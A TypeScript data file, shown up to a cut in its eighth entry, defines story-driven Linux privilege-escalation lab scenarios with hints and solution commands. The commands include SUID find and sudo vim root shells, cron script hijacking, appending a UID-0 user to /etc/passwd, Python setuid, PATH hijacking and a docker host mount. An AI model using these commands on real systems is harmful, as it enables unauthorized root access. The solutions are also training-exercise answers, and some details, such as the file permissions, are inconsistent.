import type { PrivescScenario } from './types';

export const PRIVESC_SCENARIOS: PrivescScenario[] = [
  {
    id: 'privesc-001',
    title: 'SUID Find',
    description:
      'You have a low-privilege shell on a Linux server. A routine audit reveals that common utilities may have been misconfigured. Explore the filesystem to find a way to escalate to root and capture the flag stored in /root/flag.txt.',
    technique: 'SUID Binary',
    difficulty: 'beginner',
    villain: {
      name: 'Dr. Elena Vasquez',
      alias: 'The Architect of Chaos',
      description: 'A rogue sysadmin who deliberately weakened server security to create backdoors for her hacking group.',
      avatar: '🧪',
    },
    hints: [
      'Run: find / -perm -4000 -type f 2>/dev/null',
      'The find binary has the SUID bit set — it can execute commands as the file owner.',
      'GNU find supports the -exec flag. Combine it with /bin/bash to spawn a root shell.',
    ],
    story: {
      title: 'The SUID Breach: Valkyrie\'s Welcome',
      chapters: [
        {
          id: 'ch1-discovery',
          title: 'Chapter 1: Routine Reconnaissance',
          narrative: `🔮 Valkyrie: "We have a low-privilege shell on this staging server. Before we do anything dangerous, let's map out our surroundings. Every good hack starts with recon."

Dr. Elena Vasquez — The Architect of Chaos — was NovaCorp's lead sysadmin. She deliberately weakened security to create backdoors for her hacking group. Let's trace her steps.

🗺️ Attack Flow:
[You] ──ls──> [Filesystem] ──identify──> [SUID Binary] ──exploit──> [root]

Start by listing files and checking where you are. The filesystem tells the story if you know how to read it.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'command', value: 'pwd' }],
          hint: 'Start by exploring your surroundings with ls -la',
        },
        {
          id: 'ch2-finding',
          title: 'Chapter 2: The Rogue Binary',
          narrative: `🔍 "Good recon. Now let's dig deeper. The admin notes mention a tool called 'find' with SUID permissions. SUID = Set User ID — when a binary has this bit, it runs as the FILE OWNER, not the person who executed it."

Dr. Vasquez was clever — she used a legitimate tool as her backdoor. SUID binaries are dangerous when misconfigured.

⚠️ If 'find' has SUID and is owned by root, we can use it to run commands as root!

🔎 The find command supports -exec, which lets you execute arbitrary commands. This is the vulnerability.`,
          triggers: [{ type: 'command', value: 'find' }, { type: 'output_contains', value: '4755' }],
          hint: 'Search for SUID binaries: find / -perm -4000 -type f 2>/dev/null',
        },
        {
          id: 'ch3-escalation',
          title: 'Chapter 3: Exploitation',
          narrative: `💀 "Bingo! find has SUID bit set (mode 4755). Here's the exploit chain:

  find /tmp -exec /bin/bash -p \\
    │
    ├── find runs as root (SUID)
    ├── -exec executes /bin/bash -p
    └── -p preserves the elevated UID → root shell!

Dr. Vasquez thought she was clever with this backdoor. But we've turned her own weapon against her.

🎯 Once you have root, read the flag at /root/flag.txt. Game over."`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Use find with -exec to spawn a root shell: find /tmp -exec /bin/bash -p \\;',
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\napt:x:100:65534::/nonexistent:/usr/sbin/nologin\ntrainee:x:1000:1000:trainee:/home/trainee:/bin/bash',
      '/etc/shadow': 'root:$6$rounds=656000$redacted::0:99999:7:::',
      '/home/trainee/.bash_history': 'ls -la\nwhoami\nfind / -perm -4000 -type f 2>/dev/null',
      '/home/trainee/notes.txt':
        '# System Notes\n- The sysadmin installed find with SUID for recursive audits\n- /root/flag.txt contains today\'s flag\n- Do NOT share root credentials',
      '/usr/bin/find': '[SUID binary — owned by root, mode 4755]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'find / -perm -4000 -type f 2>/dev/null',
      'find /tmp -exec /bin/bash -p \\;',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-002',
    title: 'Sudo Vim Escape',
    description:
      'You are logged in as the user "analyst". Running sudo -l reveals that your user can run vim as root without a password. Exploit this misconfiguration to read the root flag.',
    technique: 'Sudo Misconfiguration',
    difficulty: 'beginner',
    hints: [
      'Check your sudo permissions with: sudo -l',
      'Vim can execute shell commands when run with elevated privileges.',
      'From vim, run :!cat /root/flag.txt or :!bash to spawn a root shell.',
    ],
    story: {
      title: 'The Vim Trap: Breaking the Cage',
      chapters: [
        {
          id: 'ch1-permissions',
          title: 'Chapter 1: What Can I Do?',
          narrative: `🧑‍💻 You're logged in as 'analyst'. First rule of privesc: know your limits.\n\nLet's see what sudo permissions you have. The sudoers file controls who can run what as root.\n\n  📋 sudo -l  →  Shows your allowed commands\n\nIf you can run ANY program as root without a password, that program becomes your escape hatch.`,
          triggers: [{ type: 'command', value: 'sudo -l' }],
          hint: 'Check sudo permissions with sudo -l',
        },
        {
          id: 'ch2-discovery',
          title: 'Chapter 2: The Vim Door',
          narrative: `🚪 "Excellent. Sudo rules say: analyst can run vim as root (NOPASSWD). This is a critical misconfiguration."\n\nWhy is vim dangerous as root?\n  vim → :! command → executes shell commands as root\n\nVim is basically a text editor with a built-in shell escape. When run as root, that shell escape runs as root too.\n\n  ⚠️ SECURITY RULE: Never give users sudo access to vim, nano, less, man, or any editor with shell escape capability!`,
          triggers: [{ type: 'command', value: 'vim' }],
          hint: 'Run vim with sudo: sudo vim',
        },
        {
          id: 'ch3-escape',
          title: 'Chapter 3: Breaking Out',
          narrative: `🔓 "Vim is running with root privileges. Now break out of the cage."\n\nThe escape sequence:\n  1. vim opens → you're in the editor\n  2. Type :! to enter command mode\n  3. Run :!cat /root/flag.txt → executes as root\n  4. Or :!bash → spawns a root shell!\n\n  💡 Think of vim as a Trojan Horse — it looks innocent, but it hides a root shell inside.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'From vim, run :!cat /root/flag.txt to read the flag',
        },
      ],
    },
    filesystem: {
      '/etc/sudoers':
        'root\tALL=(ALL:ALL) ALL\nanalyst\tALL=(root) NOPASSWD: /usr/bin/vim\n',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nanalyst:x:1001:1001::/home/analyst:/bin/bash',
      '/home/analyst/.bash_history': 'sudo vim /etc/nginx/nginx.conf',
      '/home/analyst/README.txt':
        '# Analyst Workstation\n- You have sudo access to vim for editing configs\n- Flag is in /root/flag.txt\n- Contact admin if you need additional access',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'sudo -l',
      'sudo vim -c ":!cat /root/flag.txt"',
    ],
  },
  {
    id: 'privesc-003',
    title: 'Cron Job Hijack',
    description:
      'A legacy server runs a cleanup script every minute via cron. The script is world-writable. Exploit this to escalate privileges and read the root flag.',
    technique: 'Cron Job Abuse',
    difficulty: 'intermediate',
    hints: [
      'Examine /etc/crontab and /etc/cron.d/ for scheduled tasks.',
      'The cleanup script at /opt/cleanup.sh is owned by root but writable by everyone.',
      'Overwrite the script with a reverse shell or a command that reads the flag, then wait for cron to execute it.',
    ],
    story: {
      title: 'The Silent Chronometer: Hijacking Time',
      chapters: [
        {
          id: 'ch1-recon',
          title: 'Chapter 1: Scheduled Tasks',
          narrative: `⏰ Valkyrie: "This is an old legacy server. Cron jobs run tasks on schedules — often as root. Let's inspect the system scheduler."\n\n  📋 cat /etc/crontab  →  Shows all scheduled tasks\n\n  🕐 Cron Format:\n  ┌───────── minute (0-59)\n  │ ┌─────── hour (0-23)\n  │ │ ┌───── day of month (1-31)\n  │ │ │ ┌─── month (1-12)\n  │ │ │ │ ┌─ day of week (0-7)\n  * * * * *  command\n\nIf any scheduled task runs a script we can write to, we own the server.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'crontab' }],
          hint: 'Check scheduled tasks: cat /etc/crontab',
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Writable Script',
          narrative: `🔓 "Found it! A cleanup script at /opt/cleanup.sh runs as root every minute — and it's WORLD-READABLE."\n\n  ⚠️  /opt/cleanup.sh  —rwxrwxrwx  (writable by everyone!)\n\nAttack plan:\n  1. Overwrite /opt/cleanup.sh with our payload\n  2. Payload: cat /root/flag.txt > /tmp/flag_output.txt\n  3. Wait for cron to execute it as root\n  4. Read the flag from the output file`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'cleanup' }],
          hint: 'Check script permissions: ls -la /opt/cleanup.sh',
        },
        {
          id: 'ch3-exploitation',
          title: 'Chapter 3: Patience is a Virtue',
          narrative: `💉 "Inject the payload into the cleanup script. We're planting a seed and waiting for the cron to water it."\n\n  📝 echo '#!/bin/bash' > /opt/cleanup.sh\n  📝 echo 'cat /root/flag.txt > /tmp/flag_output.txt' >> /opt/cleanup.sh\n  📝 chmod +x /opt/cleanup.sh\n\n  ⏳ Now wait... the cron job runs every 60 seconds.`,
          triggers: [{ type: 'command', value: 'echo' }, { type: 'command', value: 'chmod' }],
          hint: 'Overwrite the script: echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/flag_output.txt\' > /opt/cleanup.sh',
        },
        {
          id: 'ch4-flag',
          title: 'Chapter 4: The Harvest',
          narrative: `🏆 "The cron job executed your script as root. The flag is now in the output file. Harvest it!"\n\n  📂 cat /tmp/flag_output.txt\n\n  💡 This is a classic "cron hijack" — the admin trusted a script that anyone could modify. In real pentests, this is one of the most common privesc vectors.`,
          triggers: [{ type: 'file_access', value: '/home/dev/flag_output.txt' }],
          hint: 'After waiting a minute, check: cat /home/dev/flag_output.txt',
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n* * * * * root\t/opt/cleanup.sh',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndev:x:1002:1002::/home/dev:/bin/bash',
      '/opt/cleanup.sh':
        '#!/bin/bash\n# Scheduled cleanup — runs every minute\n# Last modified by deploy bot 2025-11-03\nLOGDIR=/var/log/tmp\nmkdir -p $LOGDIR\nfind /tmp -type f -mtime +1 -delete\nfind /var/tmp -type f -mtime +1 -delete\necho "[$(date)] Cleanup complete" >> /var/log/cleanup.log',
      '/home/dev/notes.txt':
        '# Dev Notes\n- The cleanup script runs as root every minute\n- You can write to /opt/cleanup.sh\n- /root/flag.txt is the target\n- Make sure your payload writes to a location you can read',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /etc/crontab',
      'ls -la /opt/cleanup.sh',
      'echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/flag_output.txt\' > /opt/cleanup.sh',
      'chmod +x /opt/cleanup.sh',
      'sleep 65',
      'cat /home/dev/flag_output.txt',
    ],
  },
  {
    id: 'privesc-004',
    title: 'Writable passwd',
    description:
      'You discover that /etc/passwd is world-writable — a critical misconfiguration. Craft a password entry for a new user with root-level UID and escalate to root.',
    technique: 'Writable /etc/passwd',
    difficulty: 'intermediate',
    hints: [
      'Check file permissions: ls -la /etc/passwd',
      'You can add a new entry to /etc/passwd with UID 0 — it will be treated as root.',
      'Generate a password hash with: openssl passwd -1 -salt abc newpass',
    ],
    story: {
      title: 'The Golden Key: Overwriting Identity',
      chapters: [
        {
          id: 'ch1-discovery',
          title: 'Chapter 1: Permissive Permissions',
          narrative: `🔐 "Let's check the permissions on /etc/passwd — the system's user database."\n\n  📋 ls -la /etc/passwd\n\n  ⚠️ If this file is world-writable, anyone can add users!\n\n  /etc/passwd format:\n  username:password_hash:UID:GID:comment:home:shell\n\n  The UID field is critical:\n  UID 0 = root\n  UID 1000+ = regular user\n\nIf we add a user with UID 0, the system treats them as root.`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'passwd' }],
          hint: 'Check permissions: ls -la /etc/passwd',
        },
        {
          id: 'ch2-planning',
          title: 'Chapter 2: Crafting the Entry',
          narrative: `🛠️ "The file is writable. Now we need a password hash for our new root user."\n\n  📋 openssl passwd -1 -salt xyz newpass\n\n  Output: $1$xyz$<hash>\n\n  Why salt? Salts prevent rainbow table attacks, but in this case we're just generating a hash for our malicious user entry.`,
          triggers: [{ type: 'command', value: 'openssl' }, { type: 'output_contains', value: '$1$' }],
          hint: 'Generate password hash: openssl passwd -1 -salt xyz newpass',
        },
        {
          id: 'ch3-injection',
          title: 'Chapter 3: The Injection',
          narrative: `💉 "Time to inject. We're adding user 'pwned' with UID 0 (root) to /etc/passwd."\n\n  📝 echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd\n\n  Breakdown:\n  ┌─────────┬──────────────────────────────────────┐\n  │ pwned   │ our malicious username                │\n  │ $1$xyz$ │ password hash                         │\n  │ 0       │ UID = root!                           │\n  │ 0       │ GID = root!                           │\n  │ /root   │ home directory                        │\n  │ /bin/bash │ login shell                         │\n  └─────────┴──────────────────────────────────────┘`,
          triggers: [{ type: 'command', value: 'echo' }, { type: 'output_contains', value: '/etc/passwd' }],
          hint: 'Add user: echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd',
        },
        {
          id: 'ch4-root',
          title: 'Chapter 4: Becoming Root',
          narrative: `👑 "The trap is set. Switch to the 'pwned' user and claim your prize."\n\n  📋 su pwned\n  📋 cat /root/flag.txt\n\n  🎉 You just turned a writable file into root access. This is why /etc/passwd permissions are sacred.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Switch user: su pwned, then cat /root/flag.txt',
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\noperator:x:37:37::/root:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash',
      '/etc/passwd.perm': '-rw-r--r-- 1 root root 1847 Nov  3 10:00 /etc/passwd',
      '/etc/shadow': 'root:$6$rounds=656000$redacted::0:99999:7:::',
      '/home/ubuntu/.bash_history': 'ls -la /etc/passwd\nfind / -writable -type f 2>/dev/null',
      '/home/ubuntu/hint.txt':
        '# Recon Complete\n- /etc/passwd is world-writable!\n- You can add a user with UID 0 to gain root\n- Generate a password hash: openssl passwd -1 -salt xyz newpass\n- Then add the line to /etc/passwd\n- The flag is in /root/flag.txt',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'ls -la /etc/passwd',
      'openssl passwd -1 -salt xyz newpass',
      'echo "pwned:$1$xyz$<hash>:0:0::/root:/bin/bash" >> /etc/passwd',
      'su pwned',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-005',
    title: 'Dirty Kernel',
    description:
      'The server runs an unpatched Linux kernel with a known privilege escalation CVE. Research the kernel version and compile an exploit to gain root access.',
    technique: 'Kernel Exploit',
    difficulty: 'advanced',
    hints: [
      'Run uname -a to identify the kernel version.',
      'Linux kernel 3.13.0 is vulnerable to CVE-2015-1328 (overlayfs local privilege escalation).',
      'Search for a public exploit, compile it with gcc, and execute it to spawn a root shell.',
    ],
    story: {
      title: 'The Unpatched Leviathan: Exploiting the Core',
      chapters: [
        {
          id: 'ch1-version',
          title: 'Chapter 1: The Version Check',
          narrative: `🦣 "This server is running an ancient kernel. Let's check what we're dealing with."\n\n  📋 uname -a\n\n  ⚠️ The kernel is the heart of the OS. If it's unpatched, we might have a known CVE to exploit.\n\n  🗺️ Attack flow:\n  [Identify Version] ──> [Research CVE] ──> [Compile Exploit] ──> [root]`,
          triggers: [{ type: 'command', value: 'uname' }, { type: 'output_contains', value: '3.13' }],
          hint: 'Check kernel version: uname -a',
        },
        {
          id: 'ch2-research',
          title: 'Chapter 2: The Vulnerability',
          narrative: `🔬 "Kernel 3.13.0 — this is vulnerable to CVE-2015-1328 (OverlayFS local privilege escalation)."\n\n  📚 CVE-2015-1328:\n  ┌─────────────────────────────────────────────────┐\n  │ Affects: Linux kernels 3.13.x through 3.19.x    │\n  │ Type: Local privilege escalation                 │\n  │ Impact: Unprivileged user → root                 │\n  │ Fix: Patched in kernel 3.19.0-21                 │\n  └─────────────────────────────────────────────────┘\n\nLet's verify the OS and prepare to compile the exploit.`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: '3.13' }],
          hint: 'Check OS details: cat /etc/os-release',
        },
        {
          id: 'ch3-compilation',
          title: 'Chapter 3: Building the Weapon',
          narrative: `🔧 "GCC is installed. Time to compile the exploit."\n\n  📋 gcc exploit.c -o exploit\n\n  This transforms human-readable C code into a binary that exploits the overlayfs vulnerability. The exploit:\n  1. Creates a fake overlayfs mount\n  2. Triggers the race condition in mount handling\n  3. Gains root privileges via the kernel bug`,
          triggers: [{ type: 'command', value: 'gcc' }, { type: 'output_contains', value: 'exploit' }],
          hint: 'Compile the exploit: gcc exploit.c -o exploit',
        },
        {
          id: 'ch4-detonation',
          title: 'Chapter 4: Detonation',
          narrative: `💥 "The weapon is ready. Execute it."\n\n  📋 ./exploit\n\n  ⚡ The exploit runs, triggers CVE-2015-1328, and spawns a root shell.\n\n  🎯 If successful, you'll see: root@server:~#\n\n  This is the moment of truth — kernel exploits are binary: they either work or they crash.`,
          triggers: [{ type: 'command', value: './exploit' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Run the exploit: ./exploit',
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Crown Jewels',
          narrative: `👑 "We have root! The kernel couldn't protect itself from a known vulnerability."\n\n  📋 cat /root/flag.txt\n\n  💡 Lesson: Keep kernels patched! CVE-2015-1328 was publicly disclosed in 2015. If this server had been updated, this attack would have failed.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
        },
      ],
    },
    filesystem: {
      '/proc/version':
        'Linux server01 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 GNU/Linux',
      '/etc/os-release':
        'NAME="Ubuntu"\nVERSION="14.04.6 LTS, Trusty Tahr"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 14.04.6 LTS"',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\noperator:x:37:37::/root:/usr/sbin/nologin\ndev:x:1000:1000::/home/dev:/bin/bash',
      '/home/dev/.bash_history': 'uname -a\ncat /etc/os-release',
      '/home/dev/readme.txt':
        '# Security Audit Notes\n- Kernel is 3.13.0-24-generic — UNPATCHED\n- This version is vulnerable to CVE-2015-1328 (overlayfs)\n- gcc is installed at /usr/bin/gcc\n- Public exploits available on exploit-db\n- /root/flag.txt is the target',
      '/usr/bin/gcc': '[available — gcc 4.8.4]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'uname -a',
      'cat /etc/os-release',
      'gcc exploit.c -o exploit',
      './exploit',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-006',
    title: 'Cap Setuid Python',
    description:
      'The sysadmin granted python3 the cap_setuid capability for a deployment script. Exploit this capability to elevate to root.',
    technique: 'Capabilities',
    difficulty: 'intermediate',
    hints: [
      'Check capabilities with: getcap -r / 2>/dev/null',
      'Python3 has cap_setuid=ep — this allows it to change its effective UID.',
      'Use Python to set uid to 0 and spawn a shell.',
    ],
    story: {
      title: 'The Hidden Overlord: Capability Abuse',
      chapters: [
        {
          id: 'ch1-capabilities',
          title: 'Chapter 1: What Has Elevated Powers?',
          narrative: `🔍 "Linux capabilities are like mini-superpowers assigned to specific binaries. Let's scan for them."\n\n  📋 getcap -r / 2>/dev/null\n\n  🧠 Capabilities explained:\n  ┌─────────────────────────────────────────────────┐\n  │ cap_setuid  = change user ID (become root!)     │\n  │ cap_net_raw = sniff network traffic             │\n  │ cap_sys_admin = full system admin               │\n  └─────────────────────────────────────────────────┘\n\nIf any binary has cap_setuid, it can elevate to root — even without SUID!`,
          triggers: [{ type: 'command', value: 'getcap' }],
          hint: 'Scan for capabilities: getcap -r / 2>/dev/null',
        },
        {
          id: 'ch2-python',
          title: 'Chapter 2: The Python Backdoor',
          narrative: `🐍 "Python3 has cap_setuid=ep. The sysadmin granted this for a deployment script, but it's our golden ticket."\n\n  📋 getcap /usr/bin/python3.4\n  Output: /usr/bin/python3.4 cap_setuid=ep\n\n  ⚠️ cap_setuid=ep means:\n  e = effective (currently active)\n  p = permitted (can be activated)\n\nPython can now change its UID to 0 (root) at will!`,
          triggers: [{ type: 'command', value: 'python' }, { type: 'output_contains', value: 'cap_setuid' }],
          hint: 'Check python capabilities: getcap /usr/bin/python3.4',
        },
        {
          id: 'ch3-escalation',
          title: 'Chapter 3: One Line to Rule Them All',
          narrative: `🐍💥 "A single Python line is all it takes."\n\n  📋 python3.4 -c "import os; os.setuid(0); os.system('/bin/bash')"\n\n  Breakdown:\n  ┌─────────────────────────────────────────────────┐\n  │ import os          → OS interaction module       │\n  │ os.setuid(0)       → Change UID to root (0)     │\n  │ os.system('/bin/bash') → Spawn root shell       │\n  └─────────────────────────────────────────────────┘\n\nThe capability grants Python the right to call setuid(0) — and setuid(0) makes you root.`,
          triggers: [{ type: 'command', value: 'os.setuid' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Escalate: python3.4 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
        },
        {
          id: 'ch4-flag',
          title: 'Chapter 4: Mission Complete',
          narrative: `🏆 "You are root. The capability abuse gave us God mode."\n\n  📋 cat /root/flag.txt\n\n  💡 Lesson: Capabilities are powerful. Never grant cap_setuid, cap_sys_admin, or cap_dac_override to user-accessible binaries. One misconfigured capability = game over.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
        },
      ],
    },
    filesystem: {
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndeploy:x:1003:1003::/home/deploy:/bin/bash',
      '/etc/security/capability.conf':
        'cap_setuid=ep /usr/bin/python3.4\n',
      '/usr/bin/python3.4': '[binary with cap_setuid=ep]',
      '/home/deploy/.bash_history': 'getcap -r / 2>/dev/null',
      '/home/deploy/deploy-note.txt':
        '# Deployment Notes\n- python3 has cap_setuid for the deploy user\n- Getcap output: /usr/bin/python3.4 cap_setuid=ep\n- The flag is in /root/flag.txt\n- Hint: Python\'s os module can call setuid(0)',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'getcap -r / 2>/dev/null',
      'python3.4 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-007',
    title: 'PATH Trick',
    description:
      'A system script uses a relative path to call a utility. By placing a malicious binary earlier in your PATH, you can hijack the execution and escalate privileges.',
    technique: 'PATH Hijacking',
    difficulty: 'beginner',
    hints: [
      'Examine scripts that run as root — look for relative paths like "backup" instead of "/usr/bin/backup".',
      'Create a malicious script named "backup" in a directory you control.',
      'Add your directory to the front of PATH before the script runs.',
    ],
    story: {
      title: 'The Fake Courier: PATH Hijacking',
      chapters: [
        {
          id: 'ch1-scripts',
          title: 'Chapter 1: The Backup Mystery',
          narrative: `📦 "Let's examine the backup script that runs as root. Scripts often contain mistakes that we can exploit."\n\n  📋 cat /usr/local/bin/db_backup.sh\n\n  🔎 Look for relative paths — commands called WITHOUT /usr/bin/ prefix.\n\n  If a script says: backup --compress\n  Instead of: /usr/bin/backup --compress\n\n  Then we can HIJACK the command by placing our own 'backup' earlier in PATH!`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'backup' }],
          hint: 'Read the script: cat /usr/local/bin/db_backup.sh',
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Relative Path',
          narrative: `🎯 "The script calls 'backup' without a full path. This is the vulnerability."\n\n  ⚠️ PATH Hijacking explained:\n\n  When you type 'backup', Linux searches PATH directories:\n  /home/dev/bin → /usr/local/bin → /usr/bin → /bin\n\n  If we put a malicious 'backup' in /home/dev/bin,\n  it runs BEFORE the real /usr/bin/backup!\n\n  ┌─────────────────────────────────────────────────┐\n  │ /home/dev/bin/backup   ← OURS (runs first!)    │\n  │ /usr/bin/backup        ← legitimate (ignored)  │\n  └─────────────────────────────────────────────────┘`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'backup --' }],
          hint: 'The script uses "backup" without a full path',
        },
        {
          id: 'ch3-setup',
          title: 'Chapter 3: Setting the Trap',
          narrative: `🪤 "Plant the fake backup utility in a directory we control."\n\n  📝 mkdir -p /home/dev/bin\n  📝 cat > /home/dev/bin/backup << 'EOF'\n  #!/bin/bash\n  cat /root/flag.txt > /home/dev/root_flag.txt\n  EOF\n  📝 chmod +x /home/dev/bin/backup\n\n  🎯 Our fake backup will:\n  1. Look legitimate to the script\n  2. Actually copy the root flag to a file we can read`,
          triggers: [{ type: 'command', value: 'mkdir' }, { type: 'command', value: 'echo' }],
          hint: 'Create trap: mkdir -p /home/dev/bin && echo \'#!/bin/bash\\ncat /root/flag.txt > /home/dev/root_flag.txt\' > /home/dev/bin/backup',
        },
        {
          id: 'ch4-trigger',
          title: 'Chapter 4: Spring the Trap',
          narrative: `⚡ "Set the PATH and trigger the script."\n\n  📋 export PATH=/home/dev/bin:$PATH\n  📋 /usr/local/bin/db_backup.sh\n\n  The script calls 'backup' → Linux finds our fake one in /home/dev/bin → runs our payload as root!`,
          triggers: [{ type: 'command', value: 'export' }, { type: 'command', value: 'PATH' }],
          hint: 'Set PATH and run: export PATH=/home/dev/bin:$PATH && /usr/local/bin/db_backup.sh',
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Payoff',
          narrative: `💰 "The script executed our fake backup as root. Harvest the flag."\n\n  📋 cat /home/dev/root_flag.txt\n\n  💡 Lesson: Always use ABSOLUTE PATHS in scripts that run as root. A single relative path can be the difference between secure and compromised.`,
          triggers: [{ type: 'file_access', value: '/home/dev/root_flag.txt' }],
          hint: 'Read the flag: cat /home/dev/root_flag.txt',
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n0 2 * * * root\t/usr/local/bin/db_backup.sh',
      '/usr/local/bin/db_backup.sh':
        '#!/bin/bash\n# Nightly database backup — do not modify\nbackup --compress --dest /var/backups/db/\necho "Backup completed at $(date)" >> /var/log/backup.log',
      '/usr/bin/backup': '[legitimate backup utility owned by root]',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ndev:x:1004:1004::/home/dev:/bin/bash',
      '/home/dev/notes.txt':
        '# PATH Hijack Lab\n- /usr/local/bin/db_backup.sh runs as root via cron\n- It calls "backup" without a full path\n- Create /home/dev/bin/backup with your payload\n- Set PATH=/home/dev/bin:$PATH\n- The flag is in /root/flag.txt',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /usr/local/bin/db_backup.sh',
      'mkdir -p /home/dev/bin',
      'echo \'#!/bin/bash\ncat /root/flag.txt > /home/dev/root_flag.txt\' > /home/dev/bin/backup',
      'chmod +x /home/dev/bin/backup',
      'export PATH=/home/dev/bin:$PATH',
      'crontab -l',
      '/usr/local/bin/db_backup.sh',
      'cat /home/dev/root_flag.txt',
    ],
  },
  {
    id: 'privesc-008',
    title: 'Docker Breakout',
    description:
      'Your user is a member of the docker group. Use this membership to mount the host filesystem and read the root flag — no actual container escape needed.',
    technique: 'Docker Group',
    difficulty: 'intermediate',
    hints: [
      'Check your groups: id',
      'Members of the docker group can run docker commands, which map to the Docker daemon (root).',
      'Use: docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
    ],
    story: {
      title: 'The Container Leak: Escape to the Host',
      chapters: [
        {
          id: 'ch1-groups',
          title: 'Chapter 1: Group Membership',
          narrative: `🐳 "Docker is powerful — and dangerous if you're in the docker group."\n\n  📋 id\n\n  Look for 'docker' in your groups:\n  uid=1005(trainee) gid=1005(trainee) groups=1005(trainee),999(docker)\n\n  ⚠️ The docker group is essentially root!\n  Docker communicates with the Docker daemon, which runs as root.\n  Anyone in the docker group can mount the ENTIRE host filesystem.`,
          triggers: [{ type: 'command', value: 'id' }],
          hint: 'Check groups: id',
        },
        {
          id: 'ch2-docker',
          title: 'Chapter 2: The Docker Door',
          narrative: `🚪 "You're in the docker group. Let's confirm Docker access."\n\n  📋 docker images\n\n  If this works, you can run containers. And containers can mount host directories:\n\n  ┌─────────────────────────────────────────────────┐\n  │ docker run -v /:/mnt ...                       │\n  │   │                                             │\n  │   └─ Mounts HOST root (/) to /mnt in container │\n  │                                                 │\n  │ Inside container: /mnt = host /                 │\n  │ You can read/write ANYTHING on the host!       │\n  └─────────────────────────────────────────────────┘`,
          triggers: [{ type: 'command', value: 'docker' }, { type: 'output_contains', value: 'docker' }],
          hint: 'Check docker access: docker images',
        },
        {
          id: 'ch3-mount',
          title: 'Chapter 3: Mounting the Host',
          narrative: `💉 "One command. That's all it takes."\n\n  📋 docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt\n\n  Breaking it down:\n  -v /:/mnt    → mount host / to container /mnt\n  --rm         → remove container when done\n  -it          → interactive terminal\n  alpine       → lightweight Linux image\n  chroot /mnt  → change root to the host filesystem\n  cat /root/flag.txt → read the flag!\n\n  🎯 The container runs as root, and /mnt is the host's root.`,
          triggers: [{ type: 'command', value: 'docker run' }, { type: 'output_contains', value: '-v' }],
          hint: 'Mount host: docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
        },
        {
          id: 'ch4-flag',
